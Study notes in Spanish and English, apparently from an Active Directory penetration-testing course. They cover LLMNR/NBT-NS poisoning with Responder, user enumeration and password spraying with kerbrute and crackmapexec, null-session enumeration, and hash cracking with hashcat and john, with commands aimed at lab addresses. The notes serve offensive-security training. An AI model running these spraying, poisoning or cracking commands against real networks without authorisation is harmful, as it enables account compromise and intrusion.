# Conceptos Basicos


LDAP es la base en la que se baso Active Directory y fue introducido en 1971 y mas tarde se creo AD ya por los 90s. Para cuando salio windows 2003 se introdujo un nuevo concepto llamado ***FOREST*** El cual no es mas que:

> Característica, que permite a los administradores de sistemas crear "contenedores" de dominios, usuarios, computadoras y otros objetos separados, todo bajo el mismo paraguas

Mas tarde con la llegada de Windows 2008 se introdujo *** Active Directory Federation Services (ADFS)*** lo que permitia a los usuarios usar el SSO y con eso hizo mas facil el inicio de sesion. ( dice que en la misma LAN supongo que era una restriccion del mismo por ser nuevo)

>ADFS enables users to access applications across organizational boundaries using a single set of credentials. ADFS uses the claims-based Access Control Authorization model, which attempts to ensure security across applications by identifying users by a set of claims related to their identity, which are packaged into a security token by the identity provider.


### Windows Server 2016

Con la llegada de este SO hubo multiples mejoras en la seguridad como las cuentas ***Group Managed Service Accounts (gMSA)*** que son cuentas de servicio que se usan por ejemplo para correr alguna tarea ( o asi lo entiendo yo )

> Group managed service accounts (gMSAs) are managed domain accounts that you use to help secure services. gMSAs can run on a single server or on a server farm, such as systems behind a network load balancing or Internet Information Services (IIS) server. After you configure your services to use a gMSA principal, password management for that account is handled by the Windows operating system.

> gMSA offers a more secure way to run specific automated tasks, applications, and services and is often a recommended mitigation against the infamous Kerberoasting attack.



> La cuenta de usuario de AD sin privilegios adicionales puede enumerar la mayoría de los objetos dentro de AD. Este hecho hace que sea extremadamente importante proteger adecuadamente una implementación de AD porque CUALQUIER cuenta de usuario, independientemente de su nivel de privilegio, puede usarse para enumerar el dominio y buscar errores de configuración y fallas a fondo.




# Active Directory Pentest

Having SYSTEM-level access within a domain environment is nearly equivalent to having a domain user account.
The default Minimum password length when a new domain is created is 7

## fully qualified domain name for the host

<name.domain>

## GUID

What is an LDAP GUID?
In order to efficiently use an LDAP server, it must be possible to uniquely identify LDAP objects. GUID (global universal identifier) attributes can be used as unique identifier for an LDAP object. 

## Wireshark 

Intenta ver el trafico de la red


## Responder modo pasivo solo a escucha

>sudo responder -I ens224 -A 

## MDNS

Traducción del inglés-En las redes informáticas, el protocolo DNS de multidifusión resuelve los nombres de host en direcciones IP dentro de redes pequeñas que no incluyen un servidor de nombres local.

## FPing

Herramienta opcional para hacer barridos de ping ( hay otras opciones)

>ping -c 1 IP (-n en linux)

Here we'll start fping with a few flags: a to show targets that are alive, s to print stats at the end of the scan, g to generate a target list from the CIDR network, and q to not show per-target results.

>fping -asgq 172.126.5.0/23

>sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum

## User Listas generadores 

>https://github.com/insidetrust/statistically-likely-usernames


## Kerbrute 

Para checar usuarios validos se usa contra DC por ejemplo se prueba el usuario jsmith recuerda que tiene que tener el kerberos activado puerto 88.

>kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

# Poison the Network

## LLMNR & NBT-NS Primer

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.


# Hashes 

NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash.  NetNTLMv2 hashes are very useful once cracked, but ***cannot be used*** for techniques such as ***pash-the-hash***.

## NTLMv2

Se puede crackear offline

# RESPONDER

Se usa para envenenar trafico

> sudo responder -I ens224 

## Ruta donde se guardan los logs

> /usr/share/responder/logs

## Crack Passwords 

>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt   

# Grep saber archivos donde se encontro la palabra

>grep -l palabra_a_buscar ./*

## Inveigh
Inveigh.exe es la que yo pude usar relativamente mas facil.

# Password Policies

## Con living of land Windows

Para sacar el Password policy

> net accounts

## PowerShell

Saca la misma info que net accounts

>PS C:\> import-module .\PowerView.ps1
>PS C:\> Get-DomainPolicy

En algunos casos PowerView te saca informacion de PasswordComplexity=1 la cual brinda detalles de como debe de ser el password.

>Password complexity is enabled, meaning that a user must choose a password with 3/4 of the following: an uppercase letter, lowercase letter, number, special character (Password1 or Welcome1 would satisfy the "complexity" requirement here, but are still clearly weak passwords).


## Enumerating the Password Policy - from Linux - Credentialed

Con esto se puede sacar infromacion como por ejemplo min password length tiempo de bloqueo y intentos antes del bloqueo(This security setting determines the number of failed logon attempts that are allowed before a user account is locked out.) esto se realiza Con credenciales validas.

>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol


## Enumerating the Password Policy

Se puede enumerar mediente SMB NULL session ( SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy) o LDAP anonymous bind.

### Heramientas usadas para este fin de enumerar sesiones nulas etc.

enum4linux, CrackMapExec, rpcclient(querydominfo).

We can use rpcclient to check a Domain Controller for SMB NULL session access.

## Session nula rpcclient

> rpcclient -U "" -N 172.16.5.5

> rpcclient $> querydominfo

> rpcclient $> getdompwinfo

## Usando enum4linux 

> enum4linux -P 172.16.5.5

> enum4linux-ng -P 172.16.5.5 -oA ilfreight  #Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.

## Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as windapseach.py, ldapsearch, ad-ldapdomaindump.py, etc., to pull the password policy. With ldapsearch, it can be a bit cumbersome but doable. One example command to get the password policy is as follows:

> ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength


## Account lockout threshold

### Account lockout threshold	0  Y Account lockout duration	Not set

En cuantos intentos se bloquea la cuenta usalmente valores de 5 o 3. Pero si tienen 0 pasa que:

>Configure the Account lockout threshold setting to 0. This configuration ensures that accounts will not be locked out, and will prevent a DoS attack that intentionally attempts to lock out accounts. This configuration also helps reduce help desk calls because users cannot accidentally lock themselves out of their accounts. Because it will not prevent a brute force attack, this configuration should only be chosen if both of the following criteria are explicitly met:
The password policy requires all users to have complex passwords of 8 or more characters.
A robust audit mechanism is in place to alert administrators when a series of failed logons occur in the environment. For example, the auditing solution should monitor for security event 539, which is a logon failure; this event identifies that there was a lock on the account at the time of the logon attempt.


## Sesiones Nulas para identificar usuarios

> enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

De existir una sesion nula nos conectamos con rpclient y enumeramos los usuarios

> rpcclient -U "" -N 172.16.5.5

> enumdomusers 

> crackmapexec smb 172.16.5.5 --users

***Quiza esto se podria autoatizar con bash para buscar en todas las direcciones IPs vivas***

> ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U


## Con User y Pass validos

> sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

# Password Spray

>  for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

> kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

>  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt # intenta enumerar usuarios validos


> sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

## Validating the Credentials with CrackMapExec

> sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep + # la lista debe de ser solo el nombre de usuario ejemplo mvazquez


# Hashes

Antes de profundizar en los detalles técnicos, revisemos NTLM Relaying y describamos las condiciones necesarias para la explotación. Windows New Technology Lan Manager (NTLM) es un conjunto de protocolos de seguridad que ofrece Microsoft para autenticar y autorizar usuarios en computadoras con Windows. NTLM es un protocolo de estilo de desafío/respuesta en el que el resultado es un Hash Net-NTLMv1 o v2. Este hash es un recurso relativamente bajo para descifrarlo, pero cuando se siguen fuertes políticas de seguridad de contraseñas largas y aleatorias, se mantiene bien. Sin embargo, los hashes Net-NTLM no se pueden usar para ataques Pass-The-Hash (PTH), solo los hashes NTLM locales en la propia máquina víctima.

Cuado atacas AD los passwords pueden guardarse de todas esta maneras dependiendo de que tan viejo sea el dominio. Aunque no confundir porque tambien existe la autenticacion por los protocolos NTLM NTLMv1 NTLMv2 los cuales usan estos hashes y de ahi viene una confucion.

## LM

Los hashes mas viejitos. LM was turned off by default starting in Windows Vista/Server 2008, but might still linger in a network if there older systems are still used. It is possible to enable it in later versions through a GPO setting (even Windows 2016/10).

***Example***

>299BD128C1101FD6

### Crack

With hashcat

```bash
john --format=lm hash.txt
hashcat -m 3000 -a 3 hash.txt

```

## NTHash o NTLM hash

Ya es un poco mas reciente se puede sacar  by dumping the SAM database, or using Mimikatz.
NTLM hashes are stored in the Security Account Manager (SAM) database and in Domain Controller's NTDS.dit database. They look like this:

***Example***
> B4B9B02E6F09A9BD760F388B67351E2B
> aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42

Contrary to what you'd expect, the LM hash is the one before the semicolon and the NT hash is the one after the semicolon. Starting with Windows Vista and Windows Server 2008, by default, only the NT hash is stored

### Crack


```bash
john --format=nt hash.txt
hashcat -m 1000 -a 3 hash.txt

```
## NTLMv1

The NTLM protocol uses the NTHash in a challenge/response between a server and a client. Por lo tanto se puede usar el ***responder*** para poder obtener estos passwords.  The v1 of the protocol uses both the NT and LM hash, depending on configuration and what is available. 

Net-NTLM hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user's NT hash). Here's an example of a Net-NTLMv2 (a.k.a NTLMv2) hash:

***Example***

>u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c



```bash
john --format=netntlm hash.txt
hashcat -m 5500 -a 3 hash.txt

```

## NTLMv2

This is the new and improved version of the NTLM protocol, which makes it a bit harder to crack. The concept is the same as NTLMv1, only different algorithm and responses sent to the server. Also captured through Responder or similar. Default in Windows since Windows 2000.

***Example***

> admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030

```bash
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt

```


